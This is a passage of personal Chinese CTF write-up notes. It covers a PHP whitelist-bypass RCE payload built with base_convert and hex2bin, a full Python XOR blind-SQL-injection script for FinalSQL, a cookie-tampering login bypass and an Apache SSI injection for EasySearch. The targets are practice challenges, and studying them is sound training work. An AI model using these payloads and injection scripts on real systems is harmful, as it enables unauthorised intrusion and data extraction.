`$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}(($$pi){abs})&pi=system&abs=tac /flag`

为什么要这样写呢，由上面的动态函数可以得知，我们这里要想执行代码的话，肯定得传入一个参数名以及一个参数值

也就是说，大概是这个格式

`?c=$_GET[a]($_GET[b])&a=system&b=cat /flag`这个样子

但是明显这里是不能直接这样利用的，a和b首先是不合法的，可以用任意白名单里代替参数名，比如用pow代替a，abs代替b，当然这两个替换也行，因为这里只是参数名而已，这里不是重点，重点是对于$GET的构造，这时候就要用到前面介绍的动态函数的特性了，比如说，如果这里有$$a，且$a的值为`_GET`的化，拼接上去就变成了$_GET，而此时对于该$a的赋值则成了重点，因为要让它最后等于`_GET`,并且是用那些数学函数来实现

有一个特殊的函数hex2bin，该函数可以将16进制的数转化为二进制的字符，于是这里就需要一串16进制数来实现![image-20230627150359744](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627150359744.png)

但是白名单中是没有hex2bin函数的，我们需要获得该函数字符串

我们注意到白名单中有这样一条函数，base_convert，该函数可以将数字进行任意进制的转化，而这里就有一个很特殊的36进制，可以代替十个数字与二十六个英文字母，

![image-20230627150555008](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627150555008.png)

分析：

```php
base_convert(37907361743,10,36) => "hex2bin"//base_convert用于将一个数字在一个任意的进制之间进行转换，这里是将十进制转化为36进制，Base36 编码是一种将数字数据转换为可打印字符的编码方式，10个数字加26个英文字母，正好用36个表示出来
dechex(1598506324) => "5f474554"//dechex 是 PHP 中的一个内置函数，用于将十进制数转换为十六进制表示。
$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
```

另一种payload是这样

`$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})`
分析：

```bash
base_convert(696468,10,36) => "exec"
$pi(8768397090111664438,10,30) => "getallheaders"
exec(getallheaders(){1})
//操作xx和yy，中间用逗号隔开，echo都能输出
echo xx,yy
```

既然不能$_GET，那就header传

![image-20230627140411418](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627140411418.png)

本人测试不成功

## 16.[极客大挑战 2019]FinalSQL（异或符号进行sql盲注）



​							 ![image-20230627164953712](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627164953712.png)					

题目界面已经给出提示，盲注即可，点了点紫色的小方框，出现注入点

​							 					![image-20230627165042293](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627165042293.png)

fuzz测试后

可以用  ^ 来进行盲注

因为 1 ^ 1 = 0 (0^0)，回显错误

![image-20230627165406530](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627165406530.png)

​		1 ^ 0 = 1 (0^1)，回显正常

![image-20230627165317074](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627165317074.png)

脚本：

```python
import requests
import time
 
url="http://da5c6481-fdd8-4dc2-912a-8732691bd08b.node4.buuoj.cn:81/search.php"
 
# 0^(ord(substr(database(),1,1))>32)
def getDatabase():
    database_name=""
    for x in range(1,1000):
        low = 32
        hight = 127
        mid=(low+hight)//2
        while low < hight:
            params={
                "id":"0^(ord(substr((select(database())),"+str(x)+",1))>"+str(mid)+")"
            }
            r=requests.get(url=url,params=params)
            if "others~~~" in r.text:
                low = mid+1
            else:
                hight = mid
            mid=(low+hight)//2
        if low <=32 or hight >= 127:
            break
        database_name += chr(mid)
        print("数据库为：",database_name)
 
def getTable(): # 获取表名
    tables_name = ""
    for x in range(1,1000):
        left = 32
        right = 127
        mid=(left+right)//2
        while left < right:
            params = {
                "id" : "0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),"+str(x)+",1))>"+str(mid)+")"
            }
            r=requests.get(url=url,params=params)
            if "others~~~" in r.text:
                left = mid + 1
            else:
                right = mid
            mid = (left + right) // 2
        if left < 32 or right > 127:
            break
        tables_name += chr(mid)
        print("table:",tables_name)
        time.sleep(1)
#  F1naI1y,Flaaaaag
def getColmun():
    column_name=""
    for x in range(1,1000):
        left=32
        right=127
        mid=(left+right)//2
        while left<right:
            while left < right:
                params = {
                    "id": "0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y'))," + str(x) + ",1))>" + str(mid) + ")"
                }
                r = requests.get(url=url, params=params)
                if "others~~~" in r.text:
                    left = mid + 1
                else:
                    right = mid
                mid = (left + right) // 2
            if left < 32 or right > 127:
                break
            column_name += chr(mid)
            print("column:",  column_name)
            time.sleep(1)
 
def getFlag():
    flag=""
    for x in range(1,1000):
        left=32
        right=127
        mid=(left+right)//2
        while left<right:
            while left < right:
                params = {
                    "id": "0^(ord(substr((select(group_concat(password))from(F1naI1y))," + str(x) + ",1))>" + str(mid) + ")"
                }
                r = requests.get(url=url, params=params)
                if "others~~~" in r.text:
                    left = mid + 1
                else:
                    right = mid
                mid = (left + right) // 2
            if left < 32 or right > 127:
                break
            flag += chr(mid)
            print("flag:",  flag)
            time.sleep(1)
getDatabase()
getTable()
getColmun()
getFlag()
```

 等他爆破完即可得到flag

 ## 17.[BSidesCF 2019]Kookie（改cookie）

是一个登录框，使用万能密码尝试进行登录

![image-20230627185505674](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627185505674.png)

但是发现#被编码了，在后面再加一个#

![image-20230627185736871](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627185736871.png)

![image-20230627185742956](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627185742956.png)

登录成功

看上面提示需要用到cookie，刷新界面抓包看一下cookie

![image-20230627185823362](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627185823362.png)

将cookie里面username值改为admin

![image-20230627185856055](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627185856055.png)

得到flag

## 18.[BJDCTF2020]EasySearch（ssi代码rce）

题目是一个登录框，优先想到sql注入

![image-20230627192900663](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627192900663.png)

没有注入点，用dirsearch扫一下，一直429，麻了

那就直接抄了

扫到的是/index.php.swp文件

先了解一下这是个什么后缀

![image-20230627194029512](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627194029512.png)

网上都搜不见。。

访问一下

得到源代码，审计一下

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>

```

这里给了一个admin参数，值为6d0bc1 要求传入的password在进行MD5加密后的前六位与admin参数值相同，抄一下别人的

```python
#-*- coding:utf-8 -*-
#脚本功能：生成以指定字符为开头的md5值（6位数字）

import hashlib
import random

def encryption(chars):
    return hashlib.md5(chars).hexdigest()
def generate():
    return str(random.randint(99999,1000000))
def main():
    start = "6d0bc1"
    while True:
        strs = generate()
        print "Test %s " % strs
        if encryption(strs).startswith(start):
            print "yes!"
            print "[+] %s " % strs + "%s " % encryption(strs)
            break
        else:
            print "no!"
if __name__ == '__main__':
    main()
    print '完成！'
```

由于python版本问题就不跑了，直接抄一个2020666

传入参数即可

解决了这个麻烦，接下来就是这里的问题了

![image-20230627205033670](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627205033670.png)

这里利用了Apache SSI 远程命令执行漏洞

**shtml与ssi指令**

在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。

不难看出这里是将username中的值写入了shtml文件中

所以如果对于username中传入恶意ssi指令的话，即可进行恶意代码执行

[这篇文章](https://blog.csdn.net/qq_58970968/article/details/126396210?ops_request_misc=&request_id=&biz_id=102&utm_term=%5BBJDCTF2020%5DEasySearch%201&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-126396210.142^v88^control_2,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)记录了很多ssi指令

从网络/或者是抓包可以看到响应包中有这样一个参数

![image-20230627212403422](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627212403422.png)

提示这是url，访问一下

![image-20230627212445979](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627212445979.png)

这里的1是username中的值，我们将恶意ssi指令写入查看回显，前面的ls什么的就不演示了，直接上payload

![image-20230627214312877](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230627214312877.png)

对了，这里一定要脑子清晰

在之前的登录框时，就传入了username和password两个参数，随机便生成了输入的username值对应的shtml文件，然后在响应包中出现该文件的路径，如果在这里修改username值，回显是不会变动的，应该回登录框那里重新输入username的值，然后进行文件的读取



